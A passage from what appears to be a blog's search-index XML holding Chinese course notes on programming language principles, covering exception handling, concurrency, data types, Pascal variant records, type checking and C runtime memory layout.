<p>意味着引起异常的单元不能恢复执行；从实现的观点来看，这意味着删除异常单元的活动记录。</p>
</li>
</ol>
</blockquote>
<p>C++语言的异常处理：</p>
<blockquote>
<p>设置陷阱 try</p>
<p>抛出异常 throw</p>
<p>捕获异常 catch</p>
<p>C++的异常处理语句的格式如下：<br />
try  {  … }<br />
catch (异常类型1) { 异常1处理程序 }<br />
catch (异常类型2) {异常2处理程序}<br />
……<br />
catch (异常类型n) {异常n处理程序}</p>
</blockquote>
<p>协同程序间的控制转移关系：</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%B8%89%E7%AB%A0/image-20210413151632600.png" alt="image-20210413151632600" /></p>
<h4 id="并发单元"><a class="markdownIt-Anchor" href="#并发单元"></a> 并发单元</h4>
<p>eg：“生产者-消费者”问题</p>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%B8%89%E7%AB%A0/image-20210413151822744.png" alt="image-20210413151822744" /></p>
<h5 id="并行与并发的区别"><a class="markdownIt-Anchor" href="#并行与并发的区别"></a> 并行与并发的区别</h5>
<blockquote>
<p>并行”是指无论从微观还是宏观，二者都是一起执行的，就好像两个人各拿一把铁锨在挖坑，一小时后，每人一个大坑。<br />
而“并发”在微观上不是同时执行的，只是把时间分成若干段，使多个进程快速交替的执行，从宏观外来看，好像是这些进程都在执行，这就好像两个人用同一把铁锨，轮流挖坑，一小时后，两个人各挖一个小一点的坑，要想挖两个大一点得坑，一定会用两个小时。<br />
从以上本质不难看出，“并发”执行，在多个进程存在资源冲突时，并没有从根本提高执行效率。</p>
</blockquote>
<h5 id="同步问题"><a class="markdownIt-Anchor" href="#同步问题"></a> 同步问题</h5>
<blockquote>
<p>正确访问存储区</p>
<ul>
<li>不会向已满的缓冲区写数据</li>
<li>不会向空缓冲区读数据</li>
</ul>
</blockquote>
<h5 id="动作的不可分"><a class="markdownIt-Anchor" href="#动作的不可分"></a> 动作的“不可分”</h5>
<blockquote>
<p>append是生产者向缓冲区存数的操作</p>
<p>remove是消费者从缓冲区取数的操作</p>
<p>设t表示所存项目总数</p>
<p>这两个操作都要修改t的值,相应执行操作(1)t:=t+1和(2)t:=t-1来实现。</p>
<p>假定(1)和(2)是这样实现的:<br />
读t到一个专用寄存器;<br />
更新专用寄存器的值;<br />
将专用寄存器的值写到t;</p>
<p>则：</p>
<p>执行(1)时不能执行(2),反之亦然。<br />
即,(1)和(2)必须以互斥的方式执行,(1)或(2)是不可分的操作。</p>
</blockquote>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理第二章</title>
    <url>/archives/1934b292.html</url>
    <content><![CDATA[<h2 id="数据类型的分类"><a class="markdownIt-Anchor" href="#数据类型的分类"></a> 数据类型的分类</h2>
<h3 id="内部类型"><a class="markdownIt-Anchor" href="#内部类型"></a> 内部类型</h3>
<blockquote>
<p>优点：</p>
<ol>
<li>基本表示的不可见性</li>
<li>编译时能检查变量使用的正确性</li>
<li>编译时可以确定无二义的操作</li>
<li>精度控制</li>
</ol>
</blockquote>
<span id="more"></span>
<h3 id="用户定义类型"><a class="markdownIt-Anchor" href="#用户定义类型"></a> 用户定义类型</h3>
<blockquote>
<ol>
<li>有限映像：<br />
定义：从定义域类型DT值的有限集合，到值域类型RT值的有限集合的函数（映射）<br />
eg：array[1…50] of char 中整数1至50到字符集的有限映像</li>
<li>序列：<br />
定义：任意多个数据项组成，数据项称为序列的成分，且<strong>类型相同</strong></li>
<li>判定或：<br />
定义：可以选择不同成员的构造机制<br />
eg：PASCAL的变体记录、C的联合<br />
eg：<br />
变体记录定义如下：</li>
</ol>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> dept=(house,sports,drugs,food,liquor);</span><br><span class="line">month=<span class="number">1</span>..<span class="number">12</span>;</span><br><span class="line">item=<span class="keyword">record</span></span><br><span class="line">    price:real;</span><br><span class="line">    <span class="keyword">case</span> available:boolean <span class="keyword">of</span></span><br><span class="line">        true:(amount:integer;  </span><br><span class="line">            where:dept);</span><br><span class="line">        false:(month_expected:month)</span><br><span class="line"> <span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>
<p>实现代码如下：</p>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span>  i1,i2:item:</span><br><span class="line">i1.price:=<span class="number">5.24</span>;i1.available:=true;</span><br><span class="line">i1.amount:=<span class="number">29</span>;i1.where:=liquor;</span><br><span class="line">i2.price:=<span class="number">324.99</span>;i2.available:=false;</span><br><span class="line">i2.month_expect:=<span class="number">8</span>;</span><br></pre></td></tr></table></figure>
<p>则空间分配情况如下：</p>
<center>i1</center>
<table>
<thead>
<tr>
<th>变量名</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td>price</td>
<td>5.24</td>
</tr>
<tr>
<td>available</td>
<td>true</td>
</tr>
<tr>
<td>amount</td>
<td>29</td>
</tr>
<tr>
<td>where</td>
<td>liquor</td>
</tr>
</tbody>
</table>
<center>i2</center>
<table>
<thead>
<tr>
<th>变量名</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td>price</td>
<td>324.99</td>
</tr>
<tr>
<td>available</td>
<td>false</td>
</tr>
<tr>
<td>month_expected</td>
<td>8</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ol start="4">
<li>幂集<br />
定义：类型T的元素的所有子集的集合，T为基类型</li>
</ol>
</blockquote>
<h2 id="c语言的数据类型"><a class="markdownIt-Anchor" href="#c语言的数据类型"></a> C语言的数据类型</h2>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%8C%E7%AB%A0/image-20210414193241257.png" alt="image-20210414193241257" /></p>
<h3 id="非结构类型"><a class="markdownIt-Anchor" href="#非结构类型"></a> 非结构类型</h3>
<ol>
<li>
<p>内部类型<br />
整型：int、short、long、unsigned<br />
浮点型：float、double<br />
字符型：char（有限字符集的元素）</p>
</li>
<li>
<p>用户定义的非结构类型<br />
枚举：enum</p>
</li>
</ol>
<h3 id="结构类型"><a class="markdownIt-Anchor" href="#结构类型"></a> 结构类型</h3>
<ol>
<li>
<p>数组</p>
</li>
<li>
<p>结构struct</p>
</li>
<li>
<p>联合union（C的联合是不安全的）</p>
</li>
<li>
<p>文件FILE</p>
</li>
<li>
<p>指针</p>
</li>
<li>
<p>空类型void</p>
</li>
</ol>
<blockquote>
<p>不允许定义空类型变量，可以定义空类型指针变量</p>
</blockquote>
<h2 id="类型检查"><a class="markdownIt-Anchor" href="#类型检查"></a> 类型检查</h2>
<p>定义：对数据的操作和对应的类型是否匹配的一致性检查<br />
eg：非法运算、赋值运算、形参实参类型是否匹配</p>
<ol>
<li>静态检查和动态检查</li>
</ol>
<blockquote>
<p>静态检查使程序更有效<br />
动态检查是编程更方便，但是影响了可靠性且降低了执行效率</p>
</blockquote>
<h2 id="语言分类"><a class="markdownIt-Anchor" href="#语言分类"></a> 语言分类</h2>
<blockquote>
<p>无类型语言：没有数据类型<br />
eg：函数式语言（FP）、泛函程序设计语言（FFP）<br />
弱类型语言：类型检查全部或部分在运行时完成<br />
eg：PASCAL<br />
强类型语言：类型检查都在编译时完成<br />
eg：C、ADA</p>
</blockquote>
<h2 id="实现模型"><a class="markdownIt-Anchor" href="#实现模型"></a> 实现模型</h2>
<p>在程序中，数据由常量或变量表示<br />
在实现模型中，数据由描述符（描述数据对象的属性）和数据对象（存储区及其内容）表示</p>
<blockquote>
<ol>
<li>内部类型和用户定义的非结构类型：描述符一般由类型描述和指针组成<br />
<strong>多个变量的描述符形成变量名表</strong><br />
eg：</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> numb;</span><br></pre></td></tr></table></figure>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%8C%E7%AB%A0/image-20210411152405051.png" alt="image-20210411152405051" /></p>
<ol start="2">
<li>结构类型</li>
</ol>
<ul>
<li>笛卡尔积<br />
各成分按顺序存储，每个成分占整数个存储单元<br />
描述符包含：类型名、构造符、若干三元式（选择符名、域类型、指针）（每个域对应一个三元式）<br />
eg：</li>
</ul>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> t=recode a:real;</span><br><span class="line">              b:integer;</span><br><span class="line">       <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">var</span> x:t;</span><br></pre></td></tr></table></figure>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%8C%E7%AB%A0/image-20210411155756373.png" alt="image-20210411155756373" /></p>
<ul>
<li>有限映像<br />
为每一成分分配整数个可编址的存储单元<br />
描述符包括：类型名、构造符、<strong>定义域的基类型</strong>、下界、上界、成分类型、（每个成分占）单元个数、<strong>首地址</strong><br />
eg：</li>
</ul>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> a=<span class="keyword">array</span>[<span class="number">1</span>..<span class="number">10</span>] <span class="keyword">of</span> real;</span><br></pre></td></tr></table></figure>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%8C%E7%AB%A0/image-20210411160449254.png" alt="image-20210411160449254" /></p>
<ul>
<li>序列<br />
可变长串的表示：静态描述符+动态描述符+堆</li>
</ul>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%8C%E7%AB%A0/image-20210411161113371.png" alt="image-20210411161113371" /></p>
<ul>
<li>判定或<br />
pascal的变体记录：描述符、数据对象、case表、若干变体描述符</li>
</ul>
<figure class="highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> v=<span class="keyword">record</span> a:integer;</span><br><span class="line">              <span class="keyword">case</span> b:boolean <span class="keyword">of</span></span><br><span class="line">                   true:(c:integer);</span><br><span class="line">                   false:(d:integer;</span><br><span class="line">                          e:real)</span><br><span class="line">       <span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E4%BA%8C%E7%AB%A0/image-20210411161638987.png" alt="image-20210411161638987" /></p>
<ul>
<li>
<p>指针</p>
<p>表示与内部类型相同只是其值为地址</p>
<p>指针指向的匿名数据对象分配在堆上</p>
</li>
<li>
<p><strong>编译时所有的描述符保存在一张表中以便编译时使用，甚至有些描述符要保存到运行阶段（数组），并且存储在描述符中的属性可能随运行而变化。</strong></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>编译原理第一章</title>
    <url>/archives/29225e4a.html</url>
    <content><![CDATA[<h2 id="语言的本质"><a class="markdownIt-Anchor" href="#语言的本质"></a> 语言的本质</h2>
<p>一组规则的组合</p>
<ol>
<li>字母表的定义</li>
<li>词法规则</li>
<li>语法规则</li>
<li>语义规则</li>
<li>语用规则</li>
</ol>
   <span id="more"></span>
<h2 id="与编译有关的三种语言和三种程序"><a class="markdownIt-Anchor" href="#与编译有关的三种语言和三种程序"></a> 与编译有关的三种语言和三种程序</h2>
<table>
<thead>
<tr>
<th>源语言</th>
<th>工具语言</th>
<th>目标语言</th>
</tr>
</thead>
<tbody>
<tr>
<td>源程序</td>
<td>编译程序</td>
<td>目标程序</td>
</tr>
</tbody>
</table>
<h2 id="程序设计语言的分类"><a class="markdownIt-Anchor" href="#程序设计语言的分类"></a> 程序设计语言的分类</h2>
<table>
<thead>
<tr>
<th>强制式语言</th>
<th>函数式语言</th>
<th>逻辑式语言</th>
<th>对象式语言</th>
</tr>
</thead>
<tbody>
<tr>
<td>冯·诺依曼模型</td>
<td>数学函数（函数运算）</td>
<td>数理逻辑、谓词演算</td>
<td>抽象数据类型</td>
</tr>
</tbody>
</table>
<h2 id="冯诺依曼体系结构"><a class="markdownIt-Anchor" href="#冯诺依曼体系结构"></a> 冯·诺依曼体系结构</h2>
<ol>
<li>构成基础<br />
存储器、控制器、处理器、ip</li>
<li>特点
<ul>
<li>数据、指令以二进制形式存储</li>
<li>存储程序的工作方式</li>
<li>程序顺序执行，可强制修改执行顺序</li>
<li>存储器内容可以被修改</li>
</ul>
</li>
</ol>
<h2 id="变量的4个属性"><a class="markdownIt-Anchor" href="#变量的4个属性"></a> 变量的4个属性</h2>
<ol>
<li>
<p>作用域</p>
<blockquote>
<ul>
<li>静态绑定：依据变量定义的位置</li>
<li>动态绑定：依据过程的调用关系</li>
</ul>
</blockquote>
<ul>
<li>全局变量</li>
<li>局部变量</li>
<li>非局部变量</li>
</ul>
</li>
<li>
<p>生存期</p>
<blockquote>
<ul>
<li>全局变量静态分配</li>
<li>局部变量运行前静态分配，运行时动态分配</li>
<li>非局部变量可静态分配可动态分配</li>
<li>匿名变量是通过指针访问，是动态分配</li>
</ul>
</blockquote>
</li>
<li>
<p>值</p>
<blockquote>
<ul>
<li>二进制编码</li>
<li>按类型解释</li>
<li>变量与值的绑定是动态的</li>
<li>常量的值不能修改</li>
<li>数据对象表示存储区和它保存的值</li>
</ul>
</blockquote>
</li>
<li>
<p>类型</p>
<blockquote>
<p>静态绑定语言是面向编译的语言<br />
动态绑定语言是面向解释的语言</p>
</blockquote>
</li>
</ol>
<h2 id="虚拟机"><a class="markdownIt-Anchor" href="#虚拟机"></a> 虚拟机</h2>
<p>M1是实际的机器<br />
机器语言是汇编语言的M2=M1+汇编程序<br />
机器语言是高级语言的M3=M2+编译程序</p>
<h2 id="程序单元"><a class="markdownIt-Anchor" href="#程序单元"></a> 程序单元</h2>
<ol>
<li>
<p>定义：程序执行过程中被独立调用单元，包括子程序、分程序、过程等</p>
</li>
<li>
<p>表示：</p>
<blockquote>
<ul>
<li>
<p>编译时：单元的源程序</p>
</li>
<li>
<p>运行时：一个代码段和一个活动记录组成，称为单元实例</p>
</li>
<li>
<blockquote>
<p>活动记录：执行单元需要的信息和局部变量等数据存储区</p>
</blockquote>
</li>
</ul>
</blockquote>
</li>
<li>
<p>实例：</p>
<blockquote>
<ul>
<li>非局部变量：一个程序单元可以引用未被本单元说明而被其它单元说明的变量</li>
<li>全局变量：一个程序中各个程序单元都可以引用的变量</li>
</ul>
</blockquote>
</li>
</ol>
<h2 id="c程序运行时的存储空间"><a class="markdownIt-Anchor" href="#c程序运行时的存储空间"></a> C程序运行时的存储空间</h2>
<ol>
<li>
<p>程序代码区：存储程序代码（编译后形成的二进制机器指令序列）</p>
</li>
<li>
<p>数据静态存储区：存储程序的<strong>常量数据、全局数据、static数据</strong></p>
</li>
<li>
<p>数据动态存储区：</p>
<blockquote>
<p>栈：存储返回地址、CPU现场、临时变量、<strong>形参、局部变量</strong><br />
堆：存储动态内存申请数据</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>编译原理</tag>
      </tags>
  </entry>
</search>
